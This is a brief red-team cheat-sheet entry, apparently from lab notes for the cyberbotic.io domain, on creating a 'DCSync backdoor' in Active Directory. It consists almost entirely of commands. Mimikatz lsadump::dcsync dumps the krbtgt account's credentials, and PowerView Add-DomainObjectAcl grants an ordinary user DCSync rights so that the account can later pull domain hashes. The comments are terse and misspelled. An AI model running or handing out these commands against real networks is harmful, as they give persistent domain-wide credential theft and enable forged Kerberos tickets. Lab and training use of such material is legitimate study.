### DCSync Backdoor
```
lsadump::dcsync /user:krbtgt /domain:cyberbotic.io # ON Local Administratoin Box
PowerShell Add-DomainObjectAcl -TargetIdentity 'DC=cyberbotic,DC=io' -PrincipalIdentity 'r.meyer' -Rights DCSync #Domain Admin
lsadump::dcsync /user:krbtgt /domain:cyberbotic.io # Then Local Admin could be able to access DCSYS
 
```
